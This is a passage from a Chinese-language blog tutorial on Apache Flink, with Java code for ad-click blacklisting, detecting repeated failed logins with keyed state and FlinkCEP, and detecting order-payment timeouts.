class="string">&quot;count&quot;</span>, Long.class));</span><br><span class="line">        state = getRuntimeContext().getState(<span class="keyword">new</span> ValueStateDescriptor&lt;Boolean&gt;(<span class="string">&quot;is-sent&quot;</span>, Boolean.class));</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">processElement</span><span class="params">(AdClickEvent value, Context ctx, Collector&lt;AdClickEvent&gt; out)</span> <span class="keyword">throws</span> Exception </span>&#123;</span><br><span class="line">        <span class="comment">// 取出状态数据</span></span><br><span class="line">        Long value1 = count.value();</span><br><span class="line">        <span class="comment">// 如果是第一个数据，那么注册第二天0点的定时器，用于清空状态</span></span><br><span class="line">        <span class="keyword">if</span>(value1==<span class="keyword">null</span> || value1==<span class="number">0L</span>) &#123;</span><br><span class="line">            count.update(<span class="number">0L</span>);</span><br><span class="line">            state.update(<span class="keyword">false</span>);</span><br><span class="line">            <span class="keyword">long</span> ts = (ctx.timerService().currentProcessingTime()/(<span class="number">1000</span>*<span class="number">60</span>*<span class="number">60</span>*<span class="number">24</span>) + <span class="number">1</span>) * (<span class="number">1000</span>*<span class="number">60</span>*<span class="number">60</span>*<span class="number">24</span>);</span><br><span class="line">            ctx.timerService().registerProcessingTimeTimer(ts);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="comment">// 判断 count 值是否达到上限，如果达到，并且之前没有输出过报警信息，那么则报警</span></span><br><span class="line">        <span class="keyword">if</span>(count.value()&gt;cnt) &#123;</span><br><span class="line">            <span class="keyword">if</span>(!state.value()) &#123;</span><br><span class="line">                <span class="comment">// 旁路输出数据</span></span><br><span class="line">                ctx.output(<span class="keyword">new</span> OutputTag&lt;BlackListWarning&gt;(<span class="string">&quot;BlackListOutputTag&quot;</span>)&#123;&#125;,<span class="keyword">new</span> BlackListWarning(value.userId,value.adId,<span class="string">&quot;click over &quot;</span>+cnt+<span class="string">&quot; times today&quot;</span>));</span><br><span class="line">                <span class="comment">// 更新黑名单</span></span><br><span class="line">                state.update(<span class="keyword">true</span>);</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="keyword">return</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        count.update(count.value()+<span class="number">1</span>);</span><br><span class="line">        out.collect(value);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">onTimer</span><span class="params">(<span class="keyword">long</span> timestamp, OnTimerContext ctx, Collector&lt;AdClickEvent&gt; out)</span> <span class="keyword">throws</span> Exception </span>&#123;</span><br><span class="line">        count.clear();</span><br><span class="line">        state.clear();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h3 id="恶意登录监控"><a href="#恶意登录监控" class="headerlink" title="恶意登录监控"></a>恶意登录监控</h3><h4 id="方法一-1"><a href="#方法一-1" class="headerlink" title="方法一"></a>方法一</h4><p>最朴素的方法</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="comment">// 输入的登录事件样例类</span></span><br><span class="line"><span class="comment">// case class LoginEvent(userId: Long, ip: String, eventType: String, eventTime: Long)</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">LoginEvent</span> </span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">long</span> userId;</span><br><span class="line">    <span class="keyword">public</span> String ip;</span><br><span class="line">    <span class="keyword">public</span> String eventType;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">long</span> eventTime;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="title">LoginEvent</span><span class="params">(<span class="keyword">long</span> userId, String ip, String eventType, <span class="keyword">long</span> eventTime)</span> </span>&#123;</span><br><span class="line">        <span class="keyword">this</span>.userId = userId;</span><br><span class="line">        <span class="keyword">this</span>.ip = ip;</span><br><span class="line">        <span class="keyword">this</span>.eventType = eventType;</span><br><span class="line">        <span class="keyword">this</span>.eventTime = eventTime;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="function"><span class="keyword">public</span> String <span class="title">toString</span><span class="params">()</span> </span>&#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="string">&quot;LoginEvent&#123;&quot;</span> +</span><br><span class="line">                <span class="string">&quot;userId=&quot;</span> + userId +</span><br><span class="line">                <span class="string">&quot;, ip=&#x27;&quot;</span> + ip + <span class="string">&#x27;\&#x27;&#x27;</span> +</span><br><span class="line">                <span class="string">&quot;, eventType=&#x27;&quot;</span> + eventType + <span class="string">&#x27;\&#x27;&#x27;</span> +</span><br><span class="line">                <span class="string">&quot;, eventTime=&quot;</span> + eventTime +</span><br><span class="line">                <span class="string">&#x27;&#125;&#x27;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// 输出的报警信息样例类</span></span><br><span class="line"><span class="comment">// case class Warning(userId: Long, firstFailTime: Long, lastFailTime: Long, warningMsg: String)</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Warning</span> </span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">long</span> userId;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">long</span> firstFailTime;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">long</span> lastFailTime;</span><br><span class="line">    <span class="keyword">public</span> String warningMsg;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="title">Warning</span><span class="params">(<span class="keyword">long</span> userId, <span class="keyword">long</span> firstFailTime, <span class="keyword">long</span> lastFailTime, String warningMsg)</span> </span>&#123;</span><br><span class="line">        <span class="keyword">this</span>.userId = userId;</span><br><span class="line">        <span class="keyword">this</span>.firstFailTime = firstFailTime;</span><br><span class="line">        <span class="keyword">this</span>.lastFailTime = lastFailTime;</span><br><span class="line">        <span class="keyword">this</span>.warningMsg = warningMsg;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="function"><span class="keyword">public</span> String <span class="title">toString</span><span class="params">()</span> </span>&#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="string">&quot;Warning&#123;&quot;</span> +</span><br><span class="line">                <span class="string">&quot;userId=&quot;</span> + userId +</span><br><span class="line">                <span class="string">&quot;, firstFailTime=&quot;</span> + firstFailTime +</span><br><span class="line">                <span class="string">&quot;, lastFailTime=&quot;</span> + lastFailTime +</span><br><span class="line">                <span class="string">&quot;, warningMsg=&#x27;&quot;</span> + warningMsg + <span class="string">&#x27;\&#x27;&#x27;</span> +</span><br><span class="line">                <span class="string">&#x27;&#125;&#x27;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">LoginFailTwo</span> </span>&#123;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> Exception </span>&#123;</span><br><span class="line"></span><br><span class="line">        StreamExecutionEnvironment env = StreamExecutionEnvironment.getExecutionEnvironment();</span><br><span class="line">        env.setParallelism(<span class="number">1</span>);</span><br><span class="line">        env.setStreamTimeCharacteristic(TimeCharacteristic.EventTime);</span><br><span class="line"></span><br><span class="line">        DataStreamSource&lt;String&gt; stringDataStreamSource = env.readTextFile(<span class="string">&quot;data/LoginLog.csv&quot;</span>);</span><br><span class="line">        stringDataStreamSource.map(<span class="keyword">new</span> MapFunction&lt;String, LoginEvent&gt;() &#123;</span><br><span class="line">            <span class="meta">@Override</span></span><br><span class="line">            <span class="function"><span class="keyword">public</span> LoginEvent <span class="title">map</span><span class="params">(String s)</span> <span class="keyword">throws</span> Exception </span>&#123;</span><br><span class="line">                String[] split = s.split(<span class="string">&quot;,&quot;</span>);</span><br><span class="line">                <span class="keyword">return</span> <span class="keyword">new</span> LoginEvent(Long.parseLong(split[<span class="number">0</span>]), split[<span class="number">1</span>], split[<span class="number">2</span>], Long.parseLong(split[<span class="number">3</span>]));</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;)</span><br><span class="line">                .assignTimestampsAndWatermarks(WatermarkStrategy.&lt;LoginEvent&gt;forBoundedOutOfOrderness(Duration.ofSeconds(<span class="number">5</span>))</span><br><span class="line">                        .withTimestampAssigner((event, timestamr) -&gt; event.eventTime * <span class="number">1000</span>))</span><br><span class="line">                .keyBy(value -&gt; value.userId)</span><br><span class="line">                .process(<span class="keyword">new</span> LoginWarning())</span><br><span class="line">                .print();</span><br><span class="line"></span><br><span class="line">        env.execute();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">LoginWarning</span> <span class="keyword">extends</span> <span class="title">KeyedProcessFunction</span>&lt;<span class="title">Long</span>, <span class="title">LoginEvent</span>, <span class="title">Warning</span>&gt; </span>&#123;</span><br><span class="line"></span><br><span class="line">    ListState&lt;LoginEvent&gt; log;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">open</span><span class="params">(Configuration parameters)</span> <span class="keyword">throws</span> Exception </span>&#123;</span><br><span class="line">        log = getRuntimeContext().getListState(<span class="keyword">new</span> ListStateDescriptor&lt;LoginEvent&gt;(<span class="string">&quot;log&quot;</span>, LoginEvent.class));</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">processElement</span><span class="params">(LoginEvent value, Context ctx, Collector&lt;Warning&gt; out)</span> <span class="keyword">throws</span> Exception </span>&#123;</span><br><span class="line">        <span class="keyword">if</span>(value.eventType.equals(<span class="string">&quot;fail&quot;</span>)) &#123;</span><br><span class="line">            <span class="comment">// 先获取之前失败的事件</span></span><br><span class="line">            Iterator&lt;LoginEvent&gt; iterator = log.get().iterator();</span><br><span class="line">            <span class="keyword">if</span>(iterator.hasNext()) &#123;</span><br><span class="line">                <span class="comment">// 如果之前已经有失败的事件，就做判断，如果没有就把当前失败事件保存进state</span></span><br><span class="line">                LoginEvent next = iterator.next();</span><br><span class="line">                <span class="keyword">if</span> (value.eventTime &lt; next.eventTime + <span class="number">2</span>)&#123;</span><br><span class="line">                    out.collect(<span class="keyword">new</span> Warning( value.userId,next.eventTime,value.eventTime,<span class="string">&quot;在2秒内连续两次登录失败。&quot;</span>));</span><br><span class="line">                &#125;</span><br><span class="line"></span><br><span class="line">                <span class="comment">// 更新最近一次的登录失败事件，保存在状态里</span></span><br><span class="line">                log.clear();</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="comment">// 如果是第一次登录失败，之前把当前记录 保存至 state</span></span><br><span class="line">            log.add(value);</span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">            <span class="comment">// 当前登录状态 不为 fail，则直接清除状态</span></span><br><span class="line">            log.clear();</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<p>这有两个很大的问题，计算的是最近两秒内的情况，是写死的，不能改，同时没有考虑到乱序的信息流，这个时候我们就需要使用到flink的cep了。</p>
<h4 id="FlinkCEP-Complex-event-processing-for-Flink"><a href="#FlinkCEP-Complex-event-processing-for-Flink" class="headerlink" title="FlinkCEP - Complex event processing for Flink"></a>FlinkCEP - Complex event processing for Flink</h4><p>FlinkCEP is the Complex Event Processing (CEP) library implemented on top of Flink. </p>
<p>It allows you to detect event patterns in an endless stream of events, giving you the opportunity to get hold of what’s important in your data.</p>
<p>一个或多个由简单事件构成的事件流通过简单的规则匹配，然后输出用户想得到的数据–满足规则的复杂事件。</p>
<p>具体情况查看另一篇文章，<a href="https://woaixiaoyuyu.github.io/2021/07/26/FlinkCEP%20-%20Complex%20event%20processing%20for%20Flink/#more">链接</a></p>
<h4 id="方法二-cep"><a href="#方法二-cep" class="headerlink" title="方法二 cep"></a>方法二 cep</h4><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">LoginFailWithCep</span> </span>&#123;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> Exception </span>&#123;</span><br><span class="line"></span><br><span class="line">        StreamExecutionEnvironment env = StreamExecutionEnvironment.getExecutionEnvironment();</span><br><span class="line">        env.setParallelism(<span class="number">1</span>);</span><br><span class="line">        env.setStreamTimeCharacteristic(TimeCharacteristic.EventTime);</span><br><span class="line"></span><br><span class="line">        DataStreamSource&lt;String&gt; stringDataStreamSource = env.readTextFile(<span class="string">&quot;data/LoginLog.csv&quot;</span>);</span><br><span class="line">        KeyedStream&lt;LoginEvent, Long&gt; loginEventStream = stringDataStreamSource.map(<span class="keyword">new</span> MapFunction&lt;String, LoginEvent&gt;() &#123;</span><br><span class="line">            <span class="meta">@Override</span></span><br><span class="line">            <span class="function"><span class="keyword">public</span> LoginEvent <span class="title">map</span><span class="params">(String s)</span> <span class="keyword">throws</span> Exception </span>&#123;</span><br><span class="line">                String[] split = s.split(<span class="string">&quot;,&quot;</span>);</span><br><span class="line">                <span class="keyword">return</span> <span class="keyword">new</span> LoginEvent(Long.parseLong(split[<span class="number">0</span>]), split[<span class="number">1</span>], split[<span class="number">2</span>], Long.parseLong(split[<span class="number">3</span>]));</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;)</span><br><span class="line">                .assignTimestampsAndWatermarks(WatermarkStrategy.&lt;LoginEvent&gt;forBoundedOutOfOrderness(Duration.ofSeconds(<span class="number">5</span>))</span><br><span class="line">                        .withTimestampAssigner((event, timestamr) -&gt; event.eventTime * <span class="number">1000</span>))</span><br><span class="line">                .keyBy(value -&gt; value.userId);</span><br><span class="line"></span><br><span class="line">        <span class="comment">// 定义匹配的模式</span></span><br><span class="line">        Pattern&lt;LoginEvent, LoginEvent&gt; pattern = Pattern.&lt;LoginEvent&gt;begin(<span class="string">&quot;begin&quot;</span>).where(<span class="keyword">new</span> SimpleCondition&lt;LoginEvent&gt;() &#123;</span><br><span class="line">            <span class="meta">@Override</span></span><br><span class="line">            <span class="function"><span class="keyword">public</span> <span class="keyword">boolean</span> <span class="title">filter</span><span class="params">(LoginEvent loginEvent)</span> <span class="keyword">throws</span> Exception </span>&#123;</span><br><span class="line">                <span class="keyword">return</span> loginEvent.eventType.equals(<span class="string">&quot;fail&quot;</span>);</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;)</span><br><span class="line">                .next(<span class="string">&quot;next&quot;</span>)</span><br><span class="line">                .where(<span class="keyword">new</span> SimpleCondition&lt;LoginEvent&gt;() &#123;</span><br><span class="line">                    <span class="meta">@Override</span></span><br><span class="line">                    <span class="function"><span class="keyword">public</span> <span class="keyword">boolean</span> <span class="title">filter</span><span class="params">(LoginEvent loginEvent)</span> <span class="keyword">throws</span> Exception </span>&#123;</span><br><span class="line">                        <span class="keyword">return</span> loginEvent.eventType.equals(<span class="string">&quot;fail&quot;</span>);</span><br><span class="line">                    &#125;</span><br><span class="line">                &#125;)</span><br><span class="line">                .within(Time.seconds(<span class="number">2</span>));</span><br><span class="line"></span><br><span class="line">        <span class="comment">// 将 pattern 应用到 输入流 上，得到一个 pattern stream</span></span><br><span class="line">        PatternStream&lt;LoginEvent&gt; patternStream = CEP.pattern(loginEventStream, pattern);</span><br><span class="line"></span><br><span class="line">        <span class="comment">// 用 select 方法检出 符合模式的事件序列</span></span><br><span class="line">        SingleOutputStreamOperator&lt;Warning&gt; select = patternStream.select(<span class="keyword">new</span> LoginFailMatch());</span><br><span class="line">        select.print();</span><br><span class="line"></span><br><span class="line">        env.execute();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">LoginFailMatch</span> <span class="keyword">implements</span> <span class="title">PatternSelectFunction</span>&lt;<span class="title">LoginEvent</span>,<span class="title">Warning</span>&gt; </span>&#123;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="function"><span class="keyword">public</span> Warning <span class="title">select</span><span class="params">(Map&lt;String, List&lt;LoginEvent&gt;&gt; map)</span> <span class="keyword">throws</span> Exception </span>&#123;</span><br><span class="line">        LoginEvent begin = map.get(<span class="string">&quot;begin&quot;</span>).iterator().next();</span><br><span class="line">        LoginEvent next = map.get(<span class="string">&quot;next&quot;</span>).iterator().next();</span><br><span class="line">        <span class="keyword">return</span> <span class="keyword">new</span> Warning(begin.userId,begin.eventTime,next.eventTime,<span class="string">&quot;在2秒内连续2次登录失败。&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<p>这算一个很简单的cep，做了个简单的入门，其实需要注意的点还很多。</p>
<h3 id="订单支付实时监控"><a href="#订单支付实时监控" class="headerlink" title="订单支付实时监控"></a>订单支付实时监控</h3><p>在电商网站中，订单的支付作为直接与营销收入挂钩的一环，在业务流程中非常重要。对于订单而言，为了正确控制业务流程，也为了增加用户的支付意愿，网站一般会设置一个支付失效时间，超过一段时间不支付的订单就会被取消。另外，对于订单的支付，我们还应保证用户支付的正确性，这可以通过第三方支付平台的交易数据来做一个实时对账。在接下来的内容中，我们将实现这两个需求。</p>
<p>在电商平台中，最终创造收入和利润的是用户下单购买的环节；更具体一点，是用户真正完成支付动作的时候。用户下单的行为可以表明用户对商品的需求，但在现实中，并不是每次下单都会被用户立刻支付。当拖延一段时间后，用户支付的意愿会降低。所以为了让用户更有紧迫感从而提高支付转化率，同时也为了防范订单支付环节的安全风险，电商网站往往会对订单状态进行监控，设置一个失效时间（比如15分钟），如果下单后一段时间仍未支付，订单就会被取消。</p>
<h4 id="方法一-cep"><a href="#方法一-cep" class="headerlink" title="方法一 cep"></a>方法一 cep</h4><p>这里的重点我们是要学一下cep中select函数的方法，源码如下</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment">	 * Applies a select function to the detected pattern sequence. For each pattern sequence the</span></span><br><span class="line"><span class="comment">	 * provided &#123;<span class="doctag">@link</span> PatternSelectFunction&#125; is called. The pattern select function can produce</span></span><br><span class="line"><span class="comment">	 * exactly one resulting element.</span></span><br><span class="line"><span class="comment">	 *</span></span><br><span class="line"><span class="comment">	 * &lt;p&gt;Applies a timeout function to a partial pattern sequence which has timed out. For each</span></span><br><span class="line"><span class="comment">	 * partial pattern sequence the provided &#123;<span class="doctag">@link</span> PatternTimeoutFunction&#125; is called. The pattern</span></span><br><span class="line"><span class="comment">	 * timeout function can produce exactly one resulting element.</span></span><br><span class="line"><span class="comment">	 *</span></span><br><span class="line"><span class="comment">	 * &lt;p&gt;You can get the stream of timed-out data resulting from the</span></span><br><span class="line"><span class="comment">	 * &#123;<span class="doctag">@link</span> SingleOutputStreamOperator#getSideOutput(OutputTag)&#125; on the</span></span><br><span class="line"><span class="comment">	 * &#123;<span class="doctag">@link</span> SingleOutputStreamOperator&#125; resulting from the select operation</span></span><br><span class="line"><span class="comment">	 * with the same &#123;<span class="doctag">@link</span> OutputTag&#125;.</span></span><br><span class="line"><span class="comment">	 *</span></span><br><span class="line"><span class="comment">	 * <span class="doctag">@param</span> timedOutPartialMatchesTag &#123;<span class="doctag">@link</span> OutputTag&#125; that identifies side output with timed out patterns</span></span><br><span class="line"><span class="comment">	 * <span class="doctag">@param</span> patternTimeoutFunction The pattern timeout function which is called for each partial</span></span><br><span class="line"><span class="comment">	 *                               pattern sequence which has timed out.</span></span><br><span class="line"><span class="comment">	 * <span class="doctag">@param</span> patternSelectFunction The pattern select function which is called for each detected</span></span><br><span class="line"><span class="comment">	 *                              pattern sequence.</span></span><br><span class="line"><span class="comment">	 * <span class="doctag">@param</span> &lt;L&gt; Type of the resulting timeout elements</span></span><br><span class="line"><span class="comment">	 * <span class="doctag">@param</span> &lt;R&gt; Type of the resulting elements</span></span><br><span class="line"><span class="comment">	 * <span class="doctag">@return</span> &#123;<span class="doctag">@link</span> DataStream&#125; which contains the resulting elements with the resulting timeout</span></span><br><span class="line"><span class="comment">	 * elements in a side output.</span></span><br><span class="line"><span class="comment">	 */</span></span><br><span class="line">	<span class="keyword">public</span> &lt;L, R&gt; <span class="function">SingleOutputStreamOperator&lt;R&gt; <span class="title">select</span><span class="params">(</span></span></span><br><span class="line"><span class="params"><span class="function">    // 重点是以下几个参数</span></span></span><br><span class="line"><span class="params"><span class="function">			<span class="keyword">final</span> OutputTag&lt;L&gt; timedOutPartialMatchesTag,</span></span></span><br><span class="line"><span class="params"><span class="function">			<span class="keyword">final</span> PatternTimeoutFunction&lt;T, L&gt; patternTimeoutFunction,</span></span></span><br><span class="line"><span class="params"><span class="function">			<span class="keyword">final</span> PatternSelectFunction&lt;T, R&gt; patternSelectFunction)</span> </span>&#123;</span><br><span class="line"></span><br><span class="line">		<span class="keyword">final</span> TypeInformation&lt;R&gt; rightTypeInfo = TypeExtractor.getUnaryOperatorReturnType(</span><br><span class="line">			patternSelectFunction,</span><br><span class="line">			PatternSelectFunction.class,</span><br><span class="line">			<span class="number">0</span>,</span><br><span class="line">			<span class="number">1</span>,</span><br><span class="line">			TypeExtractor.NO_INDEX,</span><br><span class="line">			builder.getInputType(),</span><br><span class="line">			<span class="keyword">null</span>,</span><br><span class="line">			<span class="keyword">false</span>);</span><br><span class="line"></span><br><span class="line">		<span class="keyword">return</span> select(</span><br><span class="line">			timedOutPartialMatchesTag,</span><br><span class="line">			patternTimeoutFunction,</span><br><span class="line">			rightTypeInfo,</span><br><span class="line">			patternSelectFunction);</span><br><span class="line">	&#125;</span><br></pre></td></tr></table></figure>

<p>可以发现select函数还可以返回超时的时间流，比我们想象的强大得多。</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="comment">// 定义输入的订单事件样例类</span></span><br><span class="line"><span class="comment">// case class OrderEvent(orderId: Long, eventType: String, eventTime: Long)</span></span><br><span class="line"></span><br><span class="line"><span class="comment">// 定义输出的订单检测结果样例类</span></span><br><span class="line"><span class="comment">// case class OrderResult(orderId: Long, resultMsg: String)</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">OrderResult</span> </span>&#123;</span><br><span class="line">    <span class="keyword">public</span> Long orderId;</span><br><span class="line">    <span class="keyword">public</span> String resultMsg;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="title">OrderResult</span><span class="params">(Long orderId, String resultMsg)</span> </span>&#123;</span><br><span class="line">        <span class="keyword">this</span>.orderId = orderId;</span><br><span class="line">        <span class="keyword">this</span>.resultMsg = resultMsg;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="title">OrderResult</span><span class="params">()</span> </span>&#123;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="function"><span class="keyword">public</span> String <span class="title">toString</span><span class="params">()</span> </span>&#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="string">&quot;OrderResult&#123;&quot;</span> +</span><br><span class="line">                <span class="string">&quot;orderId=&quot;</span> + orderId +</span><br><span class="line">                <span class="string">&quot;, resultMsg=&#x27;&quot;</span> + resultMsg + <span class="string">&#x27;\&#x27;&#x27;</span> +</span><br><span class="line">                <span class="string">&#x27;&#125;&#x27;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">OrderEvent</span> </span>&#123;</span><br><span class="line">    <span class="keyword">public</span> Long orderId;</span><br><span class="line">    <span class="keyword">public</span> String eventType;</span><br><span class="line">    <span class="keyword">public</span> Long eventTime;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="title">OrderEvent</span><span class="params">()</span> </span>&#123;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="title">OrderEvent</span><span class="params">(Long orderId, String eventType, Long eventTime)</span> </span>&#123;</span><br><span class="line">        <span class="keyword">this</span>.orderId = orderId;</span><br><span class="line">        <span class="keyword">this</span>.eventType = eventType;</span><br><span class="line">        <span class="keyword">this</span>.eventTime = eventTime;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="function"><span class="keyword">public</span> String <span class="title">toString</span><span class="params">()</span> </span>&#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="string">&quot;OrderEvent&#123;&quot;</span> +</span><br><span class="line">                <span class="string">&quot;orderId=&quot;</span> + orderId +</span><br><span class="line">                <span class="string">&quot;, eventType=&#x27;&quot;</span> + eventType + <span class="string">&#x27;\&#x27;&#x27;</span> +</span><br><span class="line">                <span class="string">&quot;, eventTime=&quot;</span> + eventTime +</span><br><span class="line">                <span class="string">&#x27;&#125;&#x27;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">OrderTimeout</span> </span>&#123;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> Exception </span>&#123;</span><br><span class="line"></span><br><span class="line">        StreamExecutionEnvironment env = StreamExecutionEnvironment.getExecutionEnvironment();</span><br><span class="line">        env.setParallelism(<span class="number">1</span>);</span><br><span class="line">        env.setStreamTimeCharacteristic(TimeCharacteristic.EventTime);</span><br><span class="line"></span><br><span class="line">        DataStreamSource&lt;String&gt; stringDataStreamSource = env.readTextFile(<span class="string">&quot;data/OrderLog.csv&quot;</span>);</span><br><span class="line">        SingleOutputStreamOperator&lt;OrderEvent&gt; orderEventStream = stringDataStreamSource.map(<span class="keyword">new</span> MapFunction&lt;String, OrderEvent&gt;() &#123;</span><br><span class="line">            <span class="meta">@Override</span></span><br><span class="line">            <span class="function"><span class="keyword">public</span> OrderEvent <span class="title">map</span><span class="params">(String s)</span> <span class="keyword">throws</span> Exception </span>&#123;</span><br><span class="line">                String[] split = s.split(<span class="string">&quot;,&quot;</span>);</span><br><span class="line">                <span class="keyword">return</span> <span class="keyword">new</span> OrderEvent(Long.parseLong(split[<span class="number">0</span>].trim()), split[<span class="number">1</span>].trim(), Long.parseLong(split[<span class="number">3</span>].trim()));</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;)</span><br><span class="line">                .assignTimestampsAndWatermarks(WatermarkStrategy.&lt;OrderEvent&gt;forBoundedOutOfOrderness(Duration.ofSeconds(<span class="number">5</span>))</span><br><span class="line">                        .withTimestampAssigner((event, timestamr) -&gt; event.eventTime * <span class="number">1000</span>));</span><br><span class="line"></span><br><span class="line">        KeyedStream&lt;OrderEvent, Long&gt; keyedStream = orderEventStream.keyBy(value -&gt; value.orderId);</span><br><span class="line"></span><br><span class="line">        <span class="comment">// 定义匹配模式</span></span><br><span class="line">        Pattern&lt;OrderEvent, OrderEvent&gt; orderPayPattern = Pattern.&lt;OrderEvent&gt;begin(<span class="string">&quot;begin&quot;</span>).where(<span class="keyword">new</span> SimpleCondition&lt;OrderEvent&gt;() &#123;</span><br><span class="line">            <span class="meta">@Override</span></span><br><span class="line">            <span class="function"><span class="keyword">public</span> <span class="keyword">boolean</span> <span class="title">filter</span><span class="params">(OrderEvent orderEvent)</span> <span class="keyword">throws</span> Exception </span>&#123;</span><br><span class="line">                <span class="keyword">return</span> orderEvent.eventType.equals(<span class="string">&quot;create&quot;</span>);</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;).followedBy(<span class="string">&quot;follow&quot;</span>).where(<span class="keyword">new</span> SimpleCondition&lt;OrderEvent&gt;() &#123;</span><br><span class="line">            <span class="meta">@Override</span></span><br><span class="line">            <span class="function"><span class="keyword">public</span> <span class="keyword">boolean</span> <span class="title">filter</span><span class="params">(OrderEvent orderEvent)</span> <span class="keyword">throws</span> Exception </span>&#123;</span><br><span class="line">                <span class="keyword">return</span> orderEvent.eventType.equals(<span class="string">&quot;pay&quot;</span>);</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;).within(Time.minutes(<span class="number">15</span>));</span><br><span class="line"></span><br><span class="line">        <span class="comment">// 应用pattern到stream上</span></span><br><span class="line">        PatternStream&lt;OrderEvent&gt; pattern = CEP.pattern(keyedStream, orderPayPattern);</span><br><span class="line"></span><br><span class="line">        <span class="comment">// select，提取事件序列，超时的事件要做报警提示</span></span><br><span class="line">        OutputTag&lt;OrderResult&gt; orderTimeout = <span class="keyword">new</span> OutputTag&lt;OrderResult&gt;(<span class="string">&quot;orderTimeout&quot;</span>)&#123;&#125;;</span><br><span class="line">        SingleOutputStreamOperator&lt;OrderResult&gt; select = pattern.select(orderTimeout, <span class="keyword">new</span> OrderTimeoutSelect(), <span class="keyword">new</span> OrderPaySelect());</span><br><span class="line"></span><br><span class="line">        select.print();</span><br><span class="line">        select.getSideOutput(orderTimeout).print();</span><br><span class="line"></span><br><span class="line">        env.execute();</span><br><span class="line">    &#125;</span><br><span 